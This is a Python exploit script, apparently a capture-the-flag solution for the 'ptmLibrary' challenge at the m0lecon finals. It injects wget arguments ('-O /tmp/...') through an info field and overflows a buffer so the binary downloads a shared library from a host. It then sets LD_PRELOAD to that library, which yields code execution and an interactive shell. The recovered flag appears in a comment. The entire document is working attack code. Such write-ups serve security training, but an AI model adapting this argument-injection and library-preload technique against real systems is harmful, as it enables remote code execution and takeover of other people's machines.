#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':True, 'gdbscript':'set follow-fork-mode parent'}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'ptmLibrary.finals.m0lecon.it', 'port':9274})
env.select()

#==========

binf = ELF(bin_file)
addr_name    = binf.symbols['name']

libname = b'uv9045hntj'

#==========

def attack1(conn, **kwargs):
    pl = ptmLibrary(conn)
    
    pl.update_info(b'-O\x00/tmp/' + libname + b'\x00')

    exploit = b'http://localhost:4296/libsh.so'.ljust(0x82, b'\x00')
    exploit += p64(0)*5
    exploit += p64(addr_name)
    exploit += p64(addr_name+3)
    exploit += p64(0)
    pl.download(exploit)

    conn.recvuntil(b'-\n')

def attack2(conn, **kwargs):
    pl = ptmLibrary(conn)

    pl.update_info(b'LD_PRELOAD=/tmp/' + libname + b'\x00')

    exploit = b'\x00'*0x212
    exploit += p64(addr_name)*20
    exploit += p64(0)
    pl.download(exploit)

class ptmLibrary:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def download(self, url):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'URL: ', url)
        self.recvuntil(b'at ')
        return self.recvuntil(b'\n', drop=True)

    def recover(self, url, file):
        self.sendlineafter(b'> ', b'3')
        self.sendlineafter(b'URL: ', url)
        self.sendlineafter(b'filename: ', file)

    def update_info(self, name):
        self.sendlineafter(b'> ', b'4')
        self.sendlineafter(b'records: ', name)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack1)

    comn.connect()
    comn.run(attack2)
    comn.interactive()
    # ptm{now_th4t'5_4_n1ce_wg3t_sid3_3ff3c7!}

if __name__=='__main__':
    main()

#==========
